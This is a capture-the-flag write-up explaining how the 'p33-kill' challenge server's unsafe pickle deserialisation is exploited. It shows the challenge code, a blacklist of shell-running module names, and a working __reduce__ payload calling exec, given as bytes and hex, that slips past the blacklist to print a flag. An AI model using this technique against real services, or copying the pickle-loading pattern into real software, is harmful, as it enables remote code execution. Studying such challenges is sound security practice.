# p33-kill (misc)

We are given the following two Python files:
```python
import jwt 
import pickle
import os
import sys
from custom import *

os.system("openssl genrsa -out private-key.pem 2048")
os.system("openssl rsa -in private-key.pem -pubout -out public-key.pem")
with open('./private-key.pem', 'rb') as f:
   PRIVATE_KEY = f.read()
with open('./public-key.pem', 'rb') as f:
   PUBLIC_KEY = f.read()


FLAG = os.environ['secret']

blacklist=[b"os",b"subprocess",b"shlex",b"sh",b"plumbum",b"pexpect",b"fabric",b"envoy",b"commands"]

def authorise(token):
    try:
        decoded = jwt.decode(token, PUBLIC_KEY, algorithm='RS256')
    except Exception as e:
        return {"error": str(e)}
    if "admin" in decoded and decoded["admin"] =='True':
        return {"response": f"Hola admin , here is the secret  : {FLAG}"}
    elif "username" in decoded:
        return {"response": f"Bonsoir {decoded['username']}"}
    else:
        return {"error": "dunno what got wrong.. zzz"}

def create_session(username):
    encoded = jwt.encode({'username': username, 'admin': False}, PRIVATE_KEY, algorithm='RS256')
    return {"session": encoded.decode()}

if __name__=='__main__':
    while(True):
        print("""\n[+] MENU : \n 1. Authorise \n 2. Create token \n 3. Try Some De-Pickling :D \n 4. Quit \n """)
        options=int(input('[+] What is your choice : '))
        if options == 1:
            token=input('[-] Enter token :')
            print(authorise(token))
        elif options == 2:
            user=input('[-] Enter the username : ')
            print(create_session(user))
        elif options == 3:
            data=input('[-] Now you enter some serialised data in hex format , and I will do some voo-doo stuff on it : ')
            data=bytes.fromhex(data)
            for word in blacklist:
                if word in data :
                    sys.exit("I knew you were a back-stabber ..")
            #Since you reached here ,maybe I can trust you -_-
            print(pickle.loads(data))
            print("[+] I give you a chance for authorization .. ")
            token=input('[-] Enter token :')
            print(authorise(token))
            sys.exit("[+] Bye , Hope you got your answer ")
        else :
            sys.exit("See ya ..")
```
```python
class Dog:
       
    # Class Variable
    animal = 'dog'     
       
    # The init method or constructor
    def __init__(self, breed):
           
        # Instance Variable
        self.breed = breed            
   
    # Adds an instance variable 
    def setColor(self, color):
        self.color = color
       
    # Retrieves instance variable    
    def getColor(self):    
        return self.color

class secretclass:
    def secretmessage(cls, myarg):
        return myarg + " is if.. up in the sky, the sky"
    secretmessage = classmethod( secretmessage )

    def skycake(cls):
        return "cookie and sky pie people can't go up and "
    skycake = classmethod( skycake )

def classtree(cls, indent):
    print('.' * indent + cls.__name__)
    for supercls in cls.__bases__:
        classtree(supercls, indent + 3)


def instancetree(inst):
    #print('Tree of %s' % inst)
    classtree(inst.__class__, 3)


class operators(object):
    def __getattr__(self, name):
        if name == 'age':
            return 40
        else:
            raise AttributeError(name)

    def __setattr__(self, name, value):
        print('set: %s %s' % (name, value))
        if name == 'age':
            self.__dict__['_age'] = value
        else:
            self.__dict__[name] = value


# OR BETTER WAY


class properties(object):
    def getage(self):
        return 40

    def setage(self, value):
        self._age = value

    age = property(getage, setage, None, None)
    
def selftest():
    class A:
        pass

    class B(A):
        pass

    class C(A):
        pass

    class D(B, C):
        pass

    class E:
        pass

    class F(D, E):
        pass


class BaseClass1():
    def __init__(self):
        print("Base class 1")

class BaseClass2():
    def __init__(self):
        print("Base class 2")

class derivedClass (BaseClass1, BaseClass2):
    def __init__(self):
        BaseClass1.__init__(self)
        BaseClass2.__init__(self)
        print("derived class")
    def display_all(Self):
        print(self.ob1, self.ob2)

class Vehicle:
    def __init__(self, brand, model, type):
        self.brand = brand
        self.model = model
        self.type = type
        self.gas_tank_size = 14
        self.fuel_level = 0

    def fuel_up(self):
        self.fuel_level = self.gas_tank_size
        print('Gas tank is now full.')

    def drive(self):
        print(f'The {self.model} is now driving.')

class ElectricVehicle(Vehicle):
    def __init__(self, brand, model, type):
        super().__init__(brand, model, type)
        self.battery_size = 85
        self.charge_level = 0

    def charge(self):
        self.charge_level = 100
        print('The vehicle is now charged.')

    def fuel_up(self):
        print('This vehicle has no fuel tank!')

class Animal:
    # We're defining properties here! Think of them as class specific variables!
    # These are the default values that instances of the class (objects) are initiated with
    
    # Since we stated them without self. ,
    # These variables are STATIC! I.e. they're tied to the class and not the class instances
    number_of_animals = 0

    # Ok! Time to define methods! Think of them as class specific functions!

    # Define a constructor method that runs each time a new instance of the class is instantiated
    def __init__(self, name, height, weight, sound):
        # Initialise all the properties as input
        # We're setting these as protected because we want sub-classes to inherit them
        self._name = name
        self._height = height
        self._weight = weight
        self._sound = sound
        
        # Increment the static variable class counter
        Animal.number_of_animals += 1

    # Define setter methods (methods that set object properties)
    def set_name(self, name): # Self refers to the instance of the class when the method is called!
        self._name = name

    # You could go on to define the rest of them for the rest of the properties
    # I won't though

    # Define getter methods (methods that set object properties)
    def get_name(self): # Because the name is private
        return self._name
    
    def get_sound(self):
        return self._sound

    # Same here

    # One more method here:
    def get_type(self):
        print("Animal")

    # This method defines what happens when you print the object!
    def __str__(self):
        return "{} is {} cm tall, {} kg and says {}".format(self._name,
                                                              self._height,
                                                              self._weight,
                                                              self._sound)
                                                    
# Let's make a child class that inherits from Animal!

class ListInherited:
    """
    Use dir() to collect both instance attr and names inherited from
    its classes; Python 3.x shows more name than 2.x because of the
    implied object superclass in the new-style class model; getattr()
    fetches inherited names not in self.__dict__; user __str__, not
    __repr__, or else the loops when printing bound method!
    """

    def __attrname(self):
        result = ''
        for attr in dir(self):  # instance dir
            if attr[:2] == '__' and attr[-2:] == '__':
                result += '\t%s\n' % attr
            else:
                result += '\t%s=%s\n' % (attr, getattr(self, attr))
        return result

    def __str__(self):
        return '<Instance of %s, address %s:\n%s>' % (
            self.__class__.__name__,
            id(self),           # My address
            self.__attrname())  # name=value list

class Celsius:  
    def __init__(self, temperature = 0):
        self._temperature = temperature
    
    # Getter method
    def get_temperature(self):
        return self._temperature
    
    # Setter method
    def set_temperature(self, temperature):
        if temperature < -273:
            temperature = -273
        self._temperature = temperature


class Employee:
   'Common base class for all employees'
   empCount = 0

   def __init__(self, name, salary):
      self.name = name
      self.salary = salary
      Employee.empCount += 1
   
   def displayCount(self):
       pass
       #print "Total Employee %d" % Employee.empCount

   def displayEmployee(self):
       pass
       #print "Name : ", self.name,  ", Salary: ", self.salary


# Let's make a child star that inherits from Animal!

class Dragon(Animal): # The bracket makes Dragon a subclass of Animal
    _breath = ""
    
    def __init__(self, name, height, weight, sound, breath,x):
        self._breath = breath
        self.bear=x
        # The super keyword lets the parent/superclass handle what you tell it to!
        super(Dragon, self).__init__(name, height, weight, sound)
        self.whale=open(self.bear,'rb').read()
        # You COULD also write it this way, but it means remembering the name of the parent class
        print(self.whale)
        # Animal.__init__(self, name, height, weight, sound)
        
    def set_breath(self, breath):
        self._breath = breath
        
    def get_breath(self):
        return self._breath
    
    # These are different from those in Animal! They're 'polymorphisms' that overwrite the
    # implementation in the parent class!
    def get_type(self):
        print("Dragon")

    def __str__(self):
        return "{} is {} cm tall, {} kg, says {}, and breathes {}".format(self._name,
                                                                            self._height,
                                                                            self._weight,
                                                                            self._sound,
                                                                            self._breath)
    
    # Let's go through method overloading also
    
    # Which is a way for you to let methods behave differently depending on the inputs
    # There's no inbuilt way to do this in Python, but you can get around it with default arguments
    def multiple_sounds(self, times = None):
        if times is None:
            print(self.get_sound())
            return
            # Note that this works because get_sound is implemented in the parent class, Animal!
        else:
            print(self.get_sound(),str(times),"times!")

class Parent:        # define parent class
   parentAttr = 100
   def __init__(self):
       pass
        #print "Calling parent constructor"

   def parentMethod(self):
       pass
    #print 'Calling parent method'

   def setAttr(self, attr):
       pass
        #Parent.parentAttr = attr

   def getAttr(self):
       pass
      #print "Parent attribute :", Parent.parentAttr

class Child(Parent): # define child class
   def __init__(self):
       pass
       # print "Calling child constructor"

   def childMethod(self):
       pass
       # print 'Calling child method'
```
But we really only need to care about these parts:
```python
FLAG = os.environ['secret']
blacklist=[b"os",b"subprocess",b"shlex",b"sh",b"plumbum",b"pexpect",b"fabric",b"envoy",b"commands"]
```
```python
data=input('[-] Now you enter some serialised data in hex format , and I will do some voo-doo stuff on it : ')
data=bytes.fromhex(data)
for word in blacklist:
    if word in data :
        sys.exit("I knew you were a back-stabber ..")
#Since you reached here ,maybe I can trust you -_-
print(pickle.loads(data))
```
Arbitrary code execution can be achieved when unpickling untrusted pickle data through the `__reduce__` special method of pickled objects. If a type has a `__reduce__` method that returns a pair `(f, (x1, x2, ..., xn))`, where `f` is a function, then `f(x1, x2, ..., xn)` will be called when an object of that type is unpickled. So what if we just call `exec('print(FLAG)')`?
```python
>>> class C:
...   def __reduce__(self):
...     return exec, ('print(FLAG)',)
... 
>>> import pickle
>>> pickle.dumps(C(), protocol=0)
b'c__builtin__\nexec\np0\n(Vprint(FLAG)\np1\ntp2\nRp3\n.'
```
Great, the pickle data doesn't contain anything in the blacklist.
```python
>>> pickle.dumps(C(), protocol=0).hex()
'635f5f6275696c74696e5f5f0a657865630a70300a28567072696e7428464c4147290a70310a7470320a5270330a2e'
```
After giving this as input to the server, we get the flag.
